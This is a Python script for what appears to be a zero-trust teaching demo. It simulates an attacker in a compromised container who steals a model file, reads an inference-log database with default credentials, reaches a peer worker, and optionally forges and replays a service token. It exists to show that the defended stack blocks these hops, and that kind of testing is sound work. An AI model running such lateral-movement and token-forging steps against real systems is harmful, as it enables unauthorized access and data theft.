#!/usr/bin/env python3
"""
attack.py — Zero Trust Demo: lateral movement simulation

Sreelakshmi owns this file.

Plays the role of an attacker who has already compromised one container
in the cluster and now tries to move laterally: steal the model file,
read the database directly, and reach a neighbouring worker.

RUN THIS UNCHANGED AGAINST BOTH STACKS:
    Mode A (compose.baseline.yml, flat network, no auth) -> all hops succeed
    Mode B (compose.zt.yml, ztlib identity + policy)      -> hops fail at
        the first move, and the refusal is decided/logged by Amine's and
        Ishtiaq's code, not by this script.

This file must never branch on "which mode am I in" — the whole point of
the submission is that identical bytes produce a different, correctly
enforced outcome depending on which compose stack they're pointed at.

    HOP 1  steal the model   GET model-store:8080/models/llama-guard.bin
    HOP 2  read the database SELECT * FROM inference_logs LIMIT 5
    HOP 3  reach a peer      POST worker:8080/run

Print one line per hop, then: hops_attempted=3 hops_succeeded=N
Prove the theft with the SHA-256 of the retrieved file, not a status code.

Usage:
    python3 attack.py

Config is via environment variables (see CONFIG below) so the same
script works against whatever hostnames/ports each compose stack exposes.

Dependencies:
    pip install requests psycopg2-binary
"""

import hashlib
import os
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

import requests

try:
    import psycopg2
except ImportError:
    psycopg2 = None


# --------------------------------------------------------------------------
# CONFIG — override with environment variables. Confirm the real hostnames
# with Abubakar (container/network naming) before the first live run.
# --------------------------------------------------------------------------

MODEL_STORE_URL = os.environ.get("MODEL_STORE_URL", "http://model-store:8080")
MODEL_PATH = os.environ.get("MODEL_PATH", "/models/llama-guard.bin")

WORKER_URL = os.environ.get("WORKER_URL", "http://worker:8080")

PG_HOST = os.environ.get("POSTGRES_HOST", "postgres")
PG_PORT = int(os.environ.get("POSTGRES_PORT", "5432"))
PG_DB = os.environ.get("POSTGRES_DB", "inference")
PG_USER = os.environ.get("POSTGRES_USER", "app")
PG_PASSWORD = os.environ.get("POSTGRES_PASSWORD", "app")

REQUEST_TIMEOUT = float(os.environ.get("ATTACK_TIMEOUT", "5"))
LOOT_DIR = os.environ.get("LOOT_DIR", "evidence/loot")

# --- Task 3 (optional, stolen-credential replay) ---------------------------
# Requires ztlib/ to be importable from wherever attack.py runs (same repo
# layout as tests/, so it works if the attacker image copies the repo root
# or mounts ztlib/ alongside attack/ — confirm with Abubakar). Off by default.
ATTEMPT_TOKEN_REPLAY = os.environ.get("ATTEMPT_TOKEN_REPLAY", "0") == "1"

# Make ztlib importable the same way tests/test_identity.py does, in case
# ATTEMPT_TOKEN_REPLAY is enabled.
sys.path.insert(0, str(Path(__file__).resolve().parent))


@dataclass
class HopResult:
    name: str
    action: str
    ok: bool
    detail: str
    headers: dict = field(default_factory=dict)


def log_hop(n, name: str, action: str, status: str) -> None:
    print(f"[HOP {n}] {name:<12} {action:<28} -> {status}")


def _denial_detail(resp) -> tuple[str, str]:
    """
    Best-effort extraction of *why* a request was denied. Checks a JSON
    body first (matching ztlib.policy.Decision's `reason` / `rule_id`
    fields, e.g. reason="no_matching_rule"), then falls back to headers,
    then a generic default. Whoever wires the Flask views around
    ztlib.policy.evaluate() (Abubakar / Ishtiaq) — if you return the
    Decision as JSON, this picks it up automatically with no changes here.
    """
    reason = None
    rule = None
    try:
        body = resp.json()
        if isinstance(body, dict):
            reason = body.get("reason") or body.get("error")
            rule = body.get("rule_id") or body.get("matched_rule")
    except ValueError:
        pass
    if reason is None:
        reason = resp.headers.get("X-Deny-Reason")
    if rule is None:
        rule = resp.headers.get("X-ZT-Rule")
    return (reason or "denied", rule or "<none>")


# --------------------------------------------------------------------------
# Hop 1 — steal the model file from the model store
# --------------------------------------------------------------------------

def hop1_steal_model() -> HopResult:
    url = MODEL_STORE_URL.rstrip("/") + MODEL_PATH
    try:
        resp = requests.get(url, timeout=REQUEST_TIMEOUT)
    except requests.exceptions.ConnectionError:
        log_hop(1, "model-store", f"GET {MODEL_PATH}", "BLOCKED  no route to host")
        return HopResult("model-store", "steal-model", False, "connection refused")
    except requests.exceptions.Timeout:
        log_hop(1, "model-store", f"GET {MODEL_PATH}", "BLOCKED  timed out")
        return HopResult("model-store", "steal-model", False, "timeout")

    if resp.status_code == 200:
        os.makedirs(LOOT_DIR, exist_ok=True)
        loot_path = os.path.join(LOOT_DIR, os.path.basename(MODEL_PATH))
        with open(loot_path, "wb") as f:
            f.write(resp.content)

        digest = hashlib.sha256(resp.content).hexdigest()
        size_mb = len(resp.content) / (1024 * 1024)
        log_hop(
            1, "model-store", f"GET {MODEL_PATH}",
            f"200 OK  STOLEN  sha256={digest[:8]}... ({size_mb:.1f} MB)"
        )
        print(f"          full sha256: {digest}")
        print(f"          saved to:    {loot_path}")
        print("          -> compare this hash against the model store's own"
              " sha256 of the same file (Task 2 proof).")
        return HopResult("model-store", "steal-model", True, digest, dict(resp.headers))

    reason, rule = _denial_detail(resp)
    log_hop(1, "model-store", f"GET {MODEL_PATH}", f"{resp.status_code} DENIED  rule={rule} reason={reason}")
    return HopResult("model-store", "steal-model", False, reason, dict(resp.headers))


# --------------------------------------------------------------------------
# Hop 2 — read the database directly
# --------------------------------------------------------------------------

def hop2_read_database() -> HopResult:
    if psycopg2 is None:
        print("          psycopg2 not installed — pip install psycopg2-binary")
        return HopResult("postgres", "read-db", False, "driver missing")

    try:
        conn = psycopg2.connect(
            host=PG_HOST, port=PG_PORT, dbname=PG_DB,
            user=PG_USER, password=PG_PASSWORD,
            connect_timeout=int(REQUEST_TIMEOUT),
        )
    except Exception as e:
        # Expected Mode B outcome: the attacker container isn't on the DB's
        # network at all, so this is a connection-level failure, not an
        # application-level 403 — matches the brief's exact sample output.
        log_hop(2, "postgres", "SELECT inference_logs", "BLOCKED  no route to host")
        return HopResult("postgres", "read-db", False, str(e).strip())

    try:
        with conn.cursor() as cur:
            cur.execute("SELECT * FROM inference_logs LIMIT 5;")
            rows = cur.fetchall()
        log_hop(2, "postgres", "SELECT inference_logs", f"{len(rows)} rows  LEAKED")
        for row in rows:
            print(f"          {row}")
        return HopResult("postgres", "read-db", True, f"{len(rows)} rows")
    finally:
        conn.close()


# --------------------------------------------------------------------------
# Hop 3 — reach a neighbouring worker
# --------------------------------------------------------------------------

def hop3_reach_worker() -> HopResult:
    url = WORKER_URL.rstrip("/") + "/run"
    payload = {"prompt": "junk-input-from-compromised-container", "attack_probe": True}
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
    except requests.exceptions.ConnectionError:
        log_hop(3, "worker", "POST /run", "BLOCKED  no route to host")
        return HopResult("worker", "reach-worker", False, "connection refused")
    except requests.exceptions.Timeout:
        log_hop(3, "worker", "POST /run", "BLOCKED  timed out")
        return HopResult("worker", "reach-worker", False, "timeout")

    if resp.status_code == 200:
        log_hop(3, "worker", "POST /run", "200 OK  REACHED")
        return HopResult("worker", "reach-worker", True, "reached")

    reason, rule = _denial_detail(resp)
    log_hop(3, "worker", "POST /run", f"{resp.status_code} DENIED  rule={rule} reason={reason}")
    return HopResult("worker", "reach-worker", False, reason)


# --------------------------------------------------------------------------
# Hop 4 (optional, Task 3) — stolen-credential replay.
#
# ztlib/identity.py documents its own trade-off: HMAC keys are derived from
# one shared seed, so "a compromised service could mint a token for any
# other." This hop plays exactly that attacker: it mints a token claiming
# to be "worker" (as if the seed had been extracted from a compromised
# container) and presents it to the model store twice.
#
#   Mode B expected: first use -> 200 OK (the token/policy pairing genuinely
#                     works), replay -> DENIED reason=jti_replay
#   Mode A expected: both calls succeed, since baseline never checks the
#                     token at all — worth showing side by side in the PDF.
# --------------------------------------------------------------------------

def hop4_stolen_credential_replay() -> Optional[HopResult]:
    if not ATTEMPT_TOKEN_REPLAY:
        return None

    try:
        from ztlib.identity import issue, TOKEN_HEADER
    except ImportError:
        print("          ztlib not importable from here — confirm with Abubakar"
              " whether ztlib/ is copied/mounted into the attacker image"
              " before enabling ATTEMPT_TOKEN_REPLAY")
        return None

    stolen_token = issue("worker", audience="model-store")
    url = MODEL_STORE_URL.rstrip("/") + MODEL_PATH

    def _attempt(label: str):
        try:
            r = requests.get(url, headers={TOKEN_HEADER: stolen_token}, timeout=REQUEST_TIMEOUT)
        except requests.exceptions.ConnectionError:
            log_hop(4, "model-store", f"GET (stolen token, {label})", "BLOCKED  no route to host")
            return False, "connection refused"
        if r.status_code == 200:
            log_hop(4, "model-store", f"GET (stolen token, {label})", "200 OK  ACCEPTED")
            return True, "accepted"
        reason, rule = _denial_detail(r)
        log_hop(4, "model-store", f"GET (stolen token, {label})", f"{r.status_code} DENIED  rule={rule} reason={reason}")
        return False, reason

    first_ok, first_detail = _attempt("first use")
    time.sleep(0.5)
    replay_ok, replay_detail = _attempt("replay")

    if replay_ok:
        print("          ** replay succeeded — this would be a bug in the single-use check **")

    return HopResult(
        "model-store", "stolen-credential-replay",
        ok=(first_ok and not replay_ok),
        detail=f"first={first_detail} replay={replay_detail}",
    )


# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------

def main() -> None:
    print("# Zero Trust demo — attack.py")
    print(f"# model-store: {MODEL_STORE_URL}{MODEL_PATH}")
    print(f"# worker:      {WORKER_URL}/run")
    print(f"# postgres:    {PG_HOST}:{PG_PORT}/{PG_DB}")
    print()

    r1 = hop1_steal_model()
    r2 = hop2_read_database()
    r3 = hop3_reach_worker()

    core_hops = [r1, r2, r3]
    hops_attempted = len(core_hops)
    hops_succeeded = sum(1 for r in core_hops if r.ok)

    print()
    print(f"hops_attempted={hops_attempted}  hops_succeeded={hops_succeeded}")

    if ATTEMPT_TOKEN_REPLAY:
        print()
        hop4_stolen_credential_replay()

    sys.exit(0)


if __name__ == "__main__":
    main()
